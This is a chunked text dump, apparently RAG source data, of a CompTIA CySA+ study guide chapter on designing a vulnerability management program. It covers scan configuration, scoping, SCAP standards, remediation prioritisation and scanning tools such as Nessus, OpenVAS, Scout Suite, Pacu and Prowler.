them perform their duties in an efficient, effective manner. Vulnerability scanning tools allow the automated scheduling of scans to take the burden off administrators. Figure 6.3 shows an example of how these scans might be configured in Tenable’s Nessus product. Nessus was one of the first vulnerability scanners on the market and remains widely used today. Administrators may designate a schedule that meets their security, compliance, and business requirements. FIGURE 6.3 Configuring a Nessus scan Administrators should configure these scans to provide automated alerting when they detect new vulnerabilities. Many security teams configure their scans to produce automated email reports of scan results, such as the report shown in Figure 6.4. Identifying Vulnerability Management Requirements FIGURE 6.4 211 Sample Nessus scan report Many different factors influence how often an organization decides to conduct vulnerability scans against its systems: ■■ ■■ ■■ ■■ ■■ The organization’s risk appetite is its willingness to tolerate risk within the environment. If an organization is extremely risk-averse, it may choose to conduct scans more frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan. Regulatory requirements, such as PCI DSS or FISMA, may dictate a minimum frequency for vulnerability scans. These requirements may also come from corporate policies. Performance constraints may limit the frequency of scanning. For example, the scanning system may be capable of performing only a certain number of scans per day, and organizations may need to adjust scan frequency to ensure that all scans complete successfully. Operations constraints may limit the organization from conducting resource-­intensive vulnerability scans during periods
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	frequently to minimize the amount of time between when a vulnerability comes into existence and when it is detected by a scan. Regulatory requirements, such as PCI DSS or FISMA, may dictate a minimum frequency for vulnerability scans. These requirements may also come from corporate policies. Performance constraints may limit the frequency of scanning. For example, the scanning system may be capable of performing only a certain number of scans per day, and organizations may need to adjust scan frequency to ensure that all scans complete successfully. Operations constraints may limit the organization from conducting resource-­intensive vulnerability scans during periods of high business activity to avoid disruption of critical processes. Licensing limitations may curtail the bandwidth consumed by the scanner or the number of scans that may be conducted simultaneously. 212 Chapter 6 ■ Designing a Vulnerability Management Program Cybersecurity professionals must balance each of these considerations when planning a vulnerability scanning program. It is usually wise to begin small and slowly expand the scope and frequency of vulnerability scans over time to avoid overwhelming the scanning infrastructure or enterprise systems. Active vs. Passive Scanning Most vulnerability scanning tools perform active vulnerability scanning, meaning that the tool actually interacts with the scanned host to identify open services and check for possible vulnerabilities. Active scanning does provide high-­quality results, but those results come with some drawbacks: ■■ ■■ ■■ Active scanning attempts to connect to every device on a network looking for open ports and vulnerable apps. It is noisy and will likely be detected by the administrators of scanned systems. This may not be an issue in environments where administrators have knowledge of the scanning, but active scanning is problematic if the scan is meant to be stealthy. Active scanning also has the potential to accidentally exploit vulnerabilities and interfere with the functioning of production systems. Although active scanners often have settings that you can use to minimize this risk, the reality is that active scanning can cause production issues. Active scans may also completely miss some systems if they are blocked by firewalls, intrusion prevention systems, network segmentation, or other security controls. Passive vulnerability scanning takes a different approach that supplements active scans. Instead of probing systems for vulnerabilities, passive scanners monitor the network, similar to the technique used by intrusion detection systems. But instead of watching for intrusion attempts, they look for the telltale signatures of outdated systems and applications, reporting results to administrators. Passive scans have some very attractive benefits, but they’re only capable of detecting vulnerabilities that are reflected in network traffic. They’re not a replacement for active scanning, but they are a very strong complement to periodic active vulnerability scans. Exam Note Know the differences between active and passive scanning. Active scanning is “noisy” and attempts to connect to every device (IP address) on a network looking for open ports and vulnerable apps. Passive scans monitor network traffic (packets) looking for the telltale signatures of outdated systems and applications. Configuring and Executing Vulnerability Scans 213
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and applications, reporting results to administrators. Passive scans have some very attractive benefits, but they’re only capable of detecting vulnerabilities that are reflected in network traffic. They’re not a replacement for active scanning, but they are a very strong complement to periodic active vulnerability scans. Exam Note Know the differences between active and passive scanning. Active scanning is “noisy” and attempts to connect to every device (IP address) on a network looking for open ports and vulnerable apps. Passive scans monitor network traffic (packets) looking for the telltale signatures of outdated systems and applications. Configuring and Executing Vulnerability Scans 213 Configuring and Executing Vulnerability Scans Once security professionals have determined the basic requirements for their vulnerability management program, they must configure vulnerability management tools to perform scans according to the requirements-­based scan specifications. These tasks include identifying the appropriate scope for each scan, configuring scans to meet the organization’s requirements, and maintaining the currency of the vulnerability scanning tool. Scoping Vulnerability Scans The scope of a vulnerability scan describes the extent of the scan, including answers to the following questions: ■■ ■■ ■■ What systems and networks will be included in the vulnerability scan? What technical measures will be used to test whether systems are present on the network? What tests will be performed against systems discovered by a vulnerability scan? Administrators should first answer these questions in a general sense and ensure that they have consensus from technical staff and management that the scans are appropriate and unlikely to cause disruption to the business. Once they’ve determined that the scans are well designed and unlikely to cause serious issues, they may then move on to configuring the scans within the vulnerability management tool. Scoping for Compliance Purposes Scoping is an important tool in the cybersecurity analyst’s toolkit because it allows analysts to reduce problems to a manageable size. For example, an organization that processes credit cards may face the seemingly insurmountable task of achieving PCI DSS compliance across their entire network that consists of thousands of systems. Through judicious use of network segmentation and other techniques, administrators may isolate the handful of systems involved in credit card processing, segregating them from the vast majority of systems on the organization’s network. When done properly, this segmentation reduces the scope of PCI DSS compliance to the much smaller isolated network that is dedicated to payment card processing. When the organization is able to reduce the scope of the PCI DSS network, it also reduces the scope of many of the required PCI DSS controls, including vulnerability scanning. 214 Chapter 6 ■ Designing a Vulnerability Management Program (continued) Instead of contracting with an approved scanning vendor to conduct quarterly compliance scans of the organization’s entire network, they may reduce the scope of that scan to those systems that actually engage in card processing. This will dramatically reduce the cost of the scanning engagement and the remediation workload facing cybersecurity professionals after the scan completes. Configuring Vulnerability Scans Vulnerability management solutions provide administrators
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	able to reduce the scope of the PCI DSS network, it also reduces the scope of many of the required PCI DSS controls, including vulnerability scanning. 214 Chapter 6 ■ Designing a Vulnerability Management Program (continued) Instead of contracting with an approved scanning vendor to conduct quarterly compliance scans of the organization’s entire network, they may reduce the scope of that scan to those systems that actually engage in card processing. This will dramatically reduce the cost of the scanning engagement and the remediation workload facing cybersecurity professionals after the scan completes. Configuring Vulnerability Scans Vulnerability management solutions provide administrators with the ability to configure many different parameters related to scans. In addition to scheduling automated scans and producing reports, administrators can customize the types of checks performed by the scanner, provide credentials to access target servers, install scanning agents on target servers, and conduct scans from a variety of network perspectives. Scan Sensitivity Levels Cybersecurity professionals configuring vulnerability scans should pay careful attention to the configuration settings related to the scan sensitivity level. These settings determine the types of checks that the scanner will perform and should be customized to ensure that the scan meets its objectives while minimizing the possibility of disrupting the target environment. Typically, administrators create a new scan by beginning with a template. This may be a template provided by the vulnerability management vendor and built into the product, such as the Nessus templates shown in Figure 6.5, or it may be a custom-­developed template created for use within the organization. As administrators create their own scan configurations, they should consider saving common configuration settings in templates to allow efficient reuse of their work, saving time and reducing errors when configuring future scans. FIGURE 6.5 Nessus scan templates Configuring and Executing Vulnerability Scans 215 Administrators may also improve the efficiency of their scans by configuring the specific plug-­ins that will run during each scan. Each plug-­in performs a check for a specific vulnerability, and these plug-­ins are often grouped into families based on the operating system, application, or device that they involve. Disabling unnecessary plug-­ins improves the speed of the scan by bypassing unnecessary checks and also may reduce the number of false positive results detected by the scanner. A false positive is when a scan identifies normal network activity as a threat or attack. A false negative is when a threat or attack is actually taking place and the scanner fails to identify or alert on it. For example, an organization that does not use the Amazon Linux operating system may choose to disable all checks related to Amazon Linux in their scanning template. Figure 6.6 shows an example of disabling these plug-­ins in Nessus. FIGURE 6.6 Disabling unused plug-­ins Some plug-­ins perform tests that may disrupt activity on a production system or, in the worst case, damage content on those systems. These plug-­ins are a tricky situation. Administrators want to run these scans because they may identify problems that could be exploited by
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	actually taking place and the scanner fails to identify or alert on it. For example, an organization that does not use the Amazon Linux operating system may choose to disable all checks related to Amazon Linux in their scanning template. Figure 6.6 shows an example of disabling these plug-­ins in Nessus. FIGURE 6.6 Disabling unused plug-­ins Some plug-­ins perform tests that may disrupt activity on a production system or, in the worst case, damage content on those systems. These plug-­ins are a tricky situation. Administrators want to run these scans because they may identify problems that could be exploited by a malicious source. At the same time, cybersecurity professionals clearly don’t want to cause problems on the organization’s network! One way around this problem is to maintain a test environment containing copies of the same systems running on the production network and running scans against those test systems first. If the scans detect problems in the test environment, administrators may correct the underlying causes on both test and production networks before running scans on the production network. 216 Chapter 6 ■ Designing a Vulnerability Management Program Supplementing Network Scans Basic vulnerability scans run over a network, probing a system from a distance. This provides a realistic view of the system’s security by simulating what an attacker might see from another network vantage point. However, the firewalls, intrusion prevention systems, and other security controls that exist on the path between the scanner and the target server may affect the scan results, providing an inaccurate view of the server’s security independent of those controls. Additionally, many security vulnerabilities are difficult to confirm using only a remote scan. Vulnerability scans that run over the network may detect the possibility that a vulnerability exists but be unable to confirm it with confidence, causing a false positive result that requires time-­consuming administrator investigation. Modern vulnerability management solutions can supplement these remote scans with trusted information about server configurations. This information may be gathered in two ways. First, administrators can provide the scanner with credentials that allow the scanner to connect to the target server and retrieve configuration information. A credentialed scan then uses this information to determine whether a vulnerability exists, improving the scan’s accuracy over noncredentialed alternatives. For example, if a vulnerability scan detects a potential issue that can be corrected by an operating system update, the credentialed scan can check whether the update is installed on the system before reporting a vulnerability. Figure 6.7 shows an example of the credentialed scanning options available within one vulnerability scanning tool. Credentialed scans may access operating systems, databases, and applications, among other sources. FIGURE 6.7 Configuring authenticated scanning Credentialed scans typically only retrieve information from target servers and do not make changes to the server itself. Therefore, administrators should enforce the principle of least privilege by providing the scanner with a read-­only account on the server. This reduces the likelihood of a security incident related to the scanner’s credentialed access. Configuring and Executing Vulnerability Scans 217
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	is installed on the system before reporting a vulnerability. Figure 6.7 shows an example of the credentialed scanning options available within one vulnerability scanning tool. Credentialed scans may access operating systems, databases, and applications, among other sources. FIGURE 6.7 Configuring authenticated scanning Credentialed scans typically only retrieve information from target servers and do not make changes to the server itself. Therefore, administrators should enforce the principle of least privilege by providing the scanner with a read-­only account on the server. This reduces the likelihood of a security incident related to the scanner’s credentialed access. Configuring and Executing Vulnerability Scans 217 In addition to credentialed scanning, some scanners supplement the traditional server-­ based agentless scanning approach to vulnerability scanning with a complementary agent-­ based scanning approach. In this approach, administrators install small software agents on each target server. These agents conduct scans of the server configuration, providing an “inside-­out” vulnerability scan, and then report information back to the vulnerability management platform for analysis and reporting. System administrators may be wary of installing agents on the servers that they manage for fear that the agent will cause performance or stability issues. If you choose to use an agent-­based approach to scanning, you should approach this concept conservatively, beginning with a small pilot deployment that builds confidence in the agent before proceeding with a more widespread deployment. Scan Perspective Comprehensive vulnerability management programs provide the ability to conduct scans from a variety of scan perspectives. Each scan perspective conducts the scan from a different location on the network, providing a different view into vulnerabilities. For example, an external scan is run from the Internet, giving administrators a view of what an attacker located outside the organization would see as potential vulnerabilities. Internal scans might run from a scanner on the general corporate network, providing the view that a malicious insider might encounter. Finally, scanners located inside the datacenter and agents located on the servers offer the most accurate view of the real state of the server by showing vulnerabilities that might be blocked by other security controls on the network. Controls that might affect scan results include the following: ■■ Firewall settings ■■ Network segmentation ■■ Intrusion detection systems (IDSs) ■■ Intrusion prevention systems (IPSs) The internal and external scans required by PCI DSS are a good example of scans performed from different perspectives. The organization may conduct its own internal scans but must supplement them with external scans conducted by an approved scanning vendor. Vulnerability management platforms have the ability to manage different scanners and provide a consolidated view of scan results, compiling data from different sources. Figure 6.8 shows an example of how the administrator may select the scanner for a newly configured scan using the Qualys vulnerability scanner. 218 Chapter 6 FIGURE 6.8 ■ Designing a Vulnerability Management Program Choosing a scan appliance Exam Note The exam expects you to know the various types of vulnerability scans, including credentialed vs. noncredentialed, agent-­based vs. agentless, and internal vs. external. Scanner Maintenance
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	must supplement them with external scans conducted by an approved scanning vendor. Vulnerability management platforms have the ability to manage different scanners and provide a consolidated view of scan results, compiling data from different sources. Figure 6.8 shows an example of how the administrator may select the scanner for a newly configured scan using the Qualys vulnerability scanner. 218 Chapter 6 FIGURE 6.8 ■ Designing a Vulnerability Management Program Choosing a scan appliance Exam Note The exam expects you to know the various types of vulnerability scans, including credentialed vs. noncredentialed, agent-­based vs. agentless, and internal vs. external. Scanner Maintenance As with any technology product, vulnerability management solutions require care and feeding. Administrators should conduct regular maintenance of their vulnerability scanner to ensure that the scanning software and vulnerability feeds remain up-­to-­date. Scanning systems do provide automatic updating capabilities that keep the scanner and its vulnerability feeds up-to-date. Organizations can and should take advantage of these features, but it is always a good idea to check in once in a while and manually verify that the scanner is updating properly. Configuring and Executing Vulnerability Scans 219 Scanner Software Scanning systems themselves aren’t immune from vulnerabilities. As shown in Figure 6.9, even vulnerability scanners can have security issues! Regular patching of scanner software protects an organization against scanner-­specific vulnerabilities and also provides important bug fixes and feature enhancements to improve scan quality. FIGURE 6.9 Nessus vulnerability in the NIST National Vulnerability Database Source: NIST / U.S Department of Commerce / Public Domain Vulnerability Plug-­In Feeds Security researchers discover new vulnerabilities every week, and vulnerability scanners can be effective against these vulnerabilities only if they receive frequent updates to their plug-­ ins. Administrators should configure their scanners to retrieve new plug-­ins on a regular basis, preferably daily. Fortunately, as shown in Figure 6.10, this process is easily automated. 220 Chapter 6 F I G U R E 6 . 10 ■ Designing a Vulnerability Management Program Nessus Automatic Updates Security Content Automation Protocol (SCAP) The Security Content Automation Protocol (SCAP) is an effort by the security community, led by the National Institute of Standards and Technology (NIST), to create a standardized approach for communicating security-­related information. This standardization is important to the automation of interactions between security components. Some of the SCAP standards include the following: Common Configuration Enumeration (CCE) Provides a standard nomenclature for discussing system configuration issues Common Platform Enumeration (CPE) Provides a standard nomenclature for describing product names and versions Common Vulnerabilities and Exposures (CVE) describing security-­related software flaws Provides a standard nomenclature for Developing a Remediation Workflow 221 Common Vulnerability Scoring System (CVSS) Provides a standardized approach for measuring and describing the severity of security-­related software flaws Extensible Configuration Checklist Description Format (XCCDF) fying checklists and reporting checklist results Open Vulnerability and Assessment Language (OVAL) level testing procedures used by checklists A language for speci- A language for specifying low-­ For more information on SCAP, see the NIST SCAP website (http://csrc.nist.gov/ projects/security-­content-­automation-­protocol). Developing a Remediation Workflow Vulnerability scans
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	(CPE) Provides a standard nomenclature for describing product names and versions Common Vulnerabilities and Exposures (CVE) describing security-­related software flaws Provides a standard nomenclature for Developing a Remediation Workflow 221 Common Vulnerability Scoring System (CVSS) Provides a standardized approach for measuring and describing the severity of security-­related software flaws Extensible Configuration Checklist Description Format (XCCDF) fying checklists and reporting checklist results Open Vulnerability and Assessment Language (OVAL) level testing procedures used by checklists A language for speci- A language for specifying low-­ For more information on SCAP, see the NIST SCAP website (http://csrc.nist.gov/ projects/security-­content-­automation-­protocol). Developing a Remediation Workflow Vulnerability scans often produce a fairly steady stream of security issues that require attention from cybersecurity professionals, system engineers, software developers, network engineers, and other technologists. The initial scans of an environment can produce an overwhelming number of issues requiring prioritization and eventual remediation. Organizations should develop a remediation workflow that allows for the prioritization of vulnerabilities and the tracking of remediation through the cycle of detection, remediation, and testing shown in Figure 6.11. F I G U R E 6 . 11 Vulnerability management life cycle Testing Detection Remediation This remediation workflow should be as automated as possible, given the tools available to the organization. Many vulnerability management products include a built-­in workflow mechanism that allows cybersecurity experts to track vulnerabilities through the remediation process and automatically close out vulnerabilities after testing confirms that the remediation was successful. Although these tools are helpful, other organizations often choose not to 222 Chapter 6 ■ Designing a Vulnerability Management Program use them in favor of tracking vulnerabilities in the IT service management (ITSM) tool that the organization uses for other technology issues. This approach avoids asking technologists to use two different issue tracking systems and improves compliance with the remediation process. However, it also requires selecting vulnerability management tools that integrate natively with the organization’s ITSM tool (or vice versa) or building an integration between the tools if one does not already exist. An important trend in vulnerability management is a shift toward ongoing scanning and continuous monitoring. Ongoing scanning moves away from the scheduled scanning approach that tested systems on a scheduled weekly or monthly basis and instead configures scanners to simply scan systems on a rotating basis, checking for vulnerabilities as often as scanning resources permit. This approach can be bandwidth and resource intensive, but it does provide earlier detection of vulnerabilities. Continuous monitoring incorporates data from agent-­based approaches to vulnerability detection and reports security-­related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities. Exam Note Conducting ongoing scanning is an important part of any security program, but it’s only effective when you have a baseline against which to compare current results. Organizations should begin their continuous scanning program by conducting baseline security scanning that gives them an initial snapshot of their environment. They may then use ongoing scans to detect deviations from that baseline that result from
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	vulnerabilities. Continuous monitoring incorporates data from agent-­based approaches to vulnerability detection and reports security-­related configuration changes to the vulnerability management platform as soon as they occur, providing the ability to analyze those changes for potential vulnerabilities. Exam Note Conducting ongoing scanning is an important part of any security program, but it’s only effective when you have a baseline against which to compare current results. Organizations should begin their continuous scanning program by conducting baseline security scanning that gives them an initial snapshot of their environment. They may then use ongoing scans to detect deviations from that baseline that result from the remediation of existing vulnerabilities and/or the introduction of new vulnerabilities. Reporting and Communication Communicating vulnerability scan results to technologists who have the ability to remediate them and managers responsible for the security of the environment is a critical component of vulnerability management. After all, if the team members who can correct the issue never see the results, vulnerability scanning is a waste of time! Modern vulnerability management tools provide very strong reporting capabilities. These reports may be manually generated on demand to answer specific questions, or administrators may set up automated reports that generate on a scheduled basis and are pushed out to those who need to see them. Additionally, administrators may set up alerting mechanisms to immediately notify key personnel of critical new vulnerabilities as soon as they are detected. Management-­level dashboards provide a very high-­level summary of the cybersecurity health of the environment. This type of report is often used to give leaders a quick snapshot of the environment. An example of a vulnerability scanning dashboard appears in Figure 6.12. Developing a Remediation Workflow FIGURE 6.12 223 Vulnerability dashboard example As cybersecurity analysts drill deeper into the vulnerability management system, they can see summary technical reports that show the specific vulnerabilities detected on the network and sort them by vulnerability type, severity, host group, and other factors. An example of this type of report from Nessus appears in Figure 6.13. These reports are useful in identifying the widespread issues that require attention from cybersecurity professionals. FIGURE 6.13 Nessus report example by IP address 224 Chapter 6 ■ Designing a Vulnerability Management Program System engineers are typically more interested in detailed reports listing all the vulnerabilities on the systems they administer. Figure 6.14 shows a Nessus report listing all the vulnerabilities that exist on a single system scanned by the tool. The report provides a full listing of vulnerabilities, sorted by severity, and can serve as a checklist that system engineers can use to prioritize their remediation efforts for a system. F I G U R E 6 . 14 Nessus report example by criticality The final level of drill-­down provides the nitty-­gritty details required to fix an individual vulnerability on a system. Figure 6.15 shows an example of this type of reporting. The report identifies the vulnerability that was detected, explains the significance and cause of the vulnerability, and provides remediation instructions to help guide the administrator’s
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	by the tool. The report provides a full listing of vulnerabilities, sorted by severity, and can serve as a checklist that system engineers can use to prioritize their remediation efforts for a system. F I G U R E 6 . 14 Nessus report example by criticality The final level of drill-­down provides the nitty-­gritty details required to fix an individual vulnerability on a system. Figure 6.15 shows an example of this type of reporting. The report identifies the vulnerability that was detected, explains the significance and cause of the vulnerability, and provides remediation instructions to help guide the administrator’s efforts in correcting the underlying security issue. Prioritizing Remediation As cybersecurity analysts work their way through vulnerability scanning reports, they must make important decisions about prioritizing remediation to use their limited resources to resolve the issues that pose the greatest danger to the organization. There is no cut-­and-­dried formula for prioritizing vulnerabilities. Rather, analysts must take several important factors into account when choosing where to turn their attention first. Developing a Remediation Workflow F I G U R E 6 . 15 225 Detailed vulnerability report Some of the most important factors in the remediation prioritization decision-­making process include the following: Criticality of the Systems and Information Affected by the Vulnerability Criticality measures should take into account confidentiality, integrity, and availability requirements, depending on the nature of the vulnerability. For example, if the vulnerability allows a denial-­of-­service attack, cybersecurity analysts should consider the impact to the organization if the system became unusable due to an attack. If the vulnerability allows the theft of stored information from a database, cybersecurity analysts should consider the impact on the organization if that information were stolen. Difficulty of Remediating the Vulnerability If fixing a vulnerability will require an inordinate commitment of human or financial resources, that fact should be factored into the decision-­making process. Cybersecurity analysts may find that they can fix five issues rated numbers 2 through 6 in priority order for the same investment that would be required to address the top issue. This doesn’t mean that they should necessarily choose to make that decision based on cost and difficulty alone, but it is a consideration in the prioritization process. 226 Chapter 6 ■ Designing a Vulnerability Management Program Severity of the Vulnerability The more severe an issue is, the more important it is to correct that issue. Analysts may turn to the Common Vulnerability Scoring System (CVSS) to provide relative severity rankings for different vulnerabilities. Remember from earlier in this chapter that CVSS is a component of SCAP. Exposure of the Vulnerability Cybersecurity analysts should also consider how exposed the vulnerability is to potential exploitation. For example, if an internal server has a serious SQL injection vulnerability but that server is accessible only from internal networks, remediating that issue may take a lower priority than remediating a less severe issue that is exposed to the Internet and, therefore, more vulnerable to external attack. Identifying the optimal order of remediating vulnerabilities is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the Common Vulnerability Scoring System (CVSS) to provide relative severity rankings for different vulnerabilities. Remember from earlier in this chapter that CVSS is a component of SCAP. Exposure of the Vulnerability Cybersecurity analysts should also consider how exposed the vulnerability is to potential exploitation. For example, if an internal server has a serious SQL injection vulnerability but that server is accessible only from internal networks, remediating that issue may take a lower priority than remediating a less severe issue that is exposed to the Internet and, therefore, more vulnerable to external attack. Identifying the optimal order of remediating vulnerabilities is more of an art than a science. Cybersecurity analysts must evaluate all the information at their disposal and make informed decisions about the sequence of remediation that will deliver the most security value to their organization. Testing and Implementing Fixes Before deploying any remediation activity, you should thoroughly test your planned fixes in a sandbox environment. This allows you to identify any unforeseen side effects of the fix and reduces the likelihood that remediation activities will disrupt business operations or cause damage to your organization’s information assets. After deploying a fix by patching or hardening the affected system(s), you should take steps to verify that the mitigation was effective. This typically involves repeating the vulnerability scan that initially identified the vulnerability and confirming that the issue does not appear in the new scan results. When you do perform mitigation activities, it’s important to remember to update your configuration baseline as well. For example, if you apply a security patch to your systems, you should also modify your configuration baseline to ensure that future systems are patched against that same vulnerability from the start. Delayed Remediation Options It’s not always possible to remediate every vulnerability. In cases where you can’t correct the problem immediately, you have two basic options available to you. First, you can implement a compensating control. Compensating controls are additional security measures that you take to address a vulnerability without remediating the underlying issue. For example, if you have a web application that is vulnerable to SQL injection but you can’t correct the web application itself, you might use a web application firewall to block SQL injection attack attempts. The web application firewall serves as a compensating control. Second, you can decide that the risk is acceptable and that you will continue business as usual, acknowledging the risk and moving on. Overcoming Risks of Vulnerability Scanning 227 Overcoming Risks of Vulnerability Scanning Vulnerability scanning is often a high priority for cybersecurity professionals, but other technologists in the organization may not see it as an important activity. Cybersecurity analysts should be aware of the barriers raised by others to vulnerability scanning and ways to address those concerns. Some common barriers to overcome include the following: Service Degradations This is the most common barrier to vulnerability scanning raised by technology professionals. Vulnerability scans consume network bandwidth and tie up the resources on systems that are the targets of scans. This
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and moving on. Overcoming Risks of Vulnerability Scanning 227 Overcoming Risks of Vulnerability Scanning Vulnerability scanning is often a high priority for cybersecurity professionals, but other technologists in the organization may not see it as an important activity. Cybersecurity analysts should be aware of the barriers raised by others to vulnerability scanning and ways to address those concerns. Some common barriers to overcome include the following: Service Degradations This is the most common barrier to vulnerability scanning raised by technology professionals. Vulnerability scans consume network bandwidth and tie up the resources on systems that are the targets of scans. This may degrade system functionality and pose a risk of interrupting business processes. This risk increases when scans involve legacy systems or proprietary systems that might exhibit unpredictable behavior in the face of an automated vulnerability scan. Cybersecurity professionals can address these concerns by tuning scans to consume less bandwidth and coordinating scan times with operational schedules. Figure 6.16 shows ways that administrators can adjust scan intensity in one tool. Customer Commitments They can create barriers to vulnerability scanning. Memorandums of understanding (MOUs) and service-­level agreements (SLAs) with customers may create expectations related to uptime, performance, and security that the organization must fulfill. If scanning will negatively impact the organization’s ability to meet customer commitments, customers may need to participate in the decision-­making process. Cybersecurity professionals can avoid issues with MOUs and SLAs by ensuring that they are involved in the creation of those agreements in the first place. Many concerns can be avoided if customer agreements include language that anticipates vulnerability scans and acknowledges that they may have an impact on performance. Most customers will understand the importance of conducting vulnerability scans as long as you provide them with advanced notice of the timing and potential impact of scans. IT Governance and Change Management Processes These processes can create bureaucratic hurdles to making the configuration changes required to support scanning. Cybersecurity analysts should work within these organizational governance processes to obtain the resources and support required to support a vulnerability management program. 228 Chapter 6 F I G U R E 6 . 16 ■ Designing a Vulnerability Management Program Modifying scan performance settings Vulnerability Assessment Tools As you fill out your cybersecurity toolkit, you will want to have both a network vulnerability scanner and a web application scanner available for use. Vulnerability scanners are often leveraged for preventive scanning and testing and are also found in penetration testers toolkits, where they help identify systems that testers can exploit. This also means they’re a favorite tool of attackers! Infrastructure Vulnerability Scanning As you prepare for the CySA+ exam, you should be familiar with the major infrastructure vulnerability scanning tools used by cybersecurity analysts. The following tools are examples of network vulnerability scanners: ■■ ■■ Tenable’s Nessus is a well-­known and widely respected network vulnerability scanning product that was one of the earliest products in this field. Qualys’s vulnerability scanner is a more recently developed commercial network vulnerability scanner that offers
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and testing and are also found in penetration testers toolkits, where they help identify systems that testers can exploit. This also means they’re a favorite tool of attackers! Infrastructure Vulnerability Scanning As you prepare for the CySA+ exam, you should be familiar with the major infrastructure vulnerability scanning tools used by cybersecurity analysts. The following tools are examples of network vulnerability scanners: ■■ ■■ Tenable’s Nessus is a well-­known and widely respected network vulnerability scanning product that was one of the earliest products in this field. Qualys’s vulnerability scanner is a more recently developed commercial network vulnerability scanner that offers a unique deployment model using a software-­as-­a-­service Vulnerability Assessment Tools 229 (SaaS) management console to run scans using appliances located both in on-­premises datacenters and in the cloud. ■■ ■■ Rapid7’s Nexpose is another commercial vulnerability management system that offers capabilities similar to those of Nessus and Qualys. The open source OpenVAS offers a free alternative to commercial vulnerability scanners. Of these tools, the CySA+ exam focuses on Nessus and OpenVAS, so you should take the time to familiarize yourself with them. Many other examples of network vulnerability scanners are on the market today, and every mature organization should have at least one scanner in their toolkit. Many organizations choose to deploy two different vulnerability scanning products in the same environment as a defense-­in-­depth control. Cloud Infrastructure Scanning Tools Cloud infrastructure assessment tools reach into a cloud environment, retrieve security information, and deliver a report showing the relative security of the environment. They might detect issues that would not appear on other vulnerability scans. For example, a cloud-­focused tool might be able to reach into the cloud provider’s API and identify the fact that a security key has not been rotated for years. Similarly, a tool might be able to retrieve a list of all security groups applied to an instance and determine the instance’s network exposure without conducting an exhaustive port scan. Cloud providers offer many tools to their customers, often at no charge or for very low cost, as it is in the provider’s interest to ensure that resources in their environment are operated securely. For example, Figure 6.17 shows a scan run against an Amazon Web Services (AWS) environment using the AWS Inspector tool. Exam Note The CySA+ exam does not require that you be familiar with tools offered by cloud providers themselves but does require that you know three open source cloud assessment tools: Scout Suite, Pacu, and Prowler. Scout Suite Scout Suite is a multicloud auditing tool that reaches into the user’s accounts with cloud service providers and retrieves configuration information using those services’ APIs. It is capable of auditing accounts with AWS, Microsoft Azure, Google Compute Platform, Alibaba Cloud, and Oracle Cloud Infrastructure. 230 Chapter 6 F I G U R E 6 . 17 ■ Designing a Vulnerability Management Program Results of an AWS Inspector scan Scout Suite deeply probes the service configuration and searches for potential security issues. Figure 6.18 shows an
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	you know three open source cloud assessment tools: Scout Suite, Pacu, and Prowler. Scout Suite Scout Suite is a multicloud auditing tool that reaches into the user’s accounts with cloud service providers and retrieves configuration information using those services’ APIs. It is capable of auditing accounts with AWS, Microsoft Azure, Google Compute Platform, Alibaba Cloud, and Oracle Cloud Infrastructure. 230 Chapter 6 F I G U R E 6 . 17 ■ Designing a Vulnerability Management Program Results of an AWS Inspector scan Scout Suite deeply probes the service configuration and searches for potential security issues. Figure 6.18 shows an example of the high-­level dashboard generated by a Scout Suite scan. It displays the number of issues detected in each cloud service used by the customer. Detailed reports for each service then drill into the specific issues that exist in the environment. For example, Figure 6.19 shows the AWS Elastic Compute Cloud (EC2) service issues in one particular account. Expanding each item in the report shows details about the potential problem. In Figure 6.19, you see that this account has 18 Elastic Block Store (EBS) disk volumes that do not use encryption to protect data in transit or at rest. Pacu Pacu is not a scanning tool but rather a cloud-­focused exploitation framework. It works specifically with AWS accounts and is designed to help attackers determine what they can do with the access they have to an existing AWS account. For this reason, it is a favorite tool of AWS penetration testers. Vulnerability Assessment Tools F I G U R E 6 . 18 231 Scout Suite dashboard from an AWS account scan Working with Pacu is quite similar to working with Metasploit in that Pacu offers a modular framework of plug-­ins that test and probe various information sources. Figure 6.20 provides a partial listing of the AWS exploitation plug-­ins available for Pacu. 232 Chapter 6 F I G U R E 6 . 19 ■ Designing a Vulnerability Management Program EC2 security issues reported during a Scout Suite scan Prowler Prowler is a security configuration testing tool, quite similar to Scout Suite in purpose. Prowler does perform deeper testing of some parameters, but it is limited to scanning AWS, Microsoft Azure, and Google Compute Platform environments. Figure 6.21 shows the partial result of a Prowler scan against an AWS account. Vulnerability Assessment Tools FIGURE 6.20 233 Partial listing of the exploits available in Pacu Web Application Scanning Web application scanners are specialized tools used to examine the security of web applications. These tools test for web-­specific vulnerabilities, such as SQL injection, cross-­site scripting (XSS), and cross-­site request forgery (CSRF) vulnerabilities. They work by combining traditional network scans of web servers with detailed probing of web applications using such techniques as sending known malicious input sequences and fuzzing in attempts to break the application. You’ll learn more about fuzzing in Chapter 8, “Responding to Vulnerabilities.” Nikto is one of the two open source web application scanning tools that are required
